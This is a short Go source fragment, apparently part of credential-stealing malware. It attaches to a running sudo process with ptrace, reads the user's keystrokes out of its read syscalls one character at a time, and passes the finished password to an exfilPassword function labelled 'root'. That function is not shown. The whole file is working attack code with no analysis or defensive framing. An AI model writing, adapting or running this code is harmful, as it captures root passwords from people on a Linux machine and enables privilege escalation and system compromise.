package main

import (
	"runtime"
	"syscall"
)

func traceSUDOProcess(pid int) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	err := syscall.PtraceAttach(pid)
	if err != nil {
		return
	}
	defer func() {
		syscall.PtraceDetach(pid)
	}()
	var wstatus syscall.WaitStatus
	var password string
	var bitFlip bool
	for {
		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}

		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			var regs syscall.PtraceRegs
			err := syscall.PtraceGetRegs(pid, &regs)
			if err != nil {
				syscall.PtraceDetach(pid)
				return
			}
			if (regs.Rdi == 6 || regs.Rdi == 8) && regs.Orig_rax == 0 {
				buffer := make([]byte, regs.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
				if err != nil {
					return
				}
				if len(buffer) == 1 {
					for _, char := range buffer {
						if char == '\n' {
							go exfilPassword("root", password)
							password = ""
							break
						} else if char != '\x00' && len(buffer) == 1 && bitFlip {
							password += string(char)
						}
					}
				}
				bitFlip = !bitFlip
			}
		}

		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			return
		}
	}
}
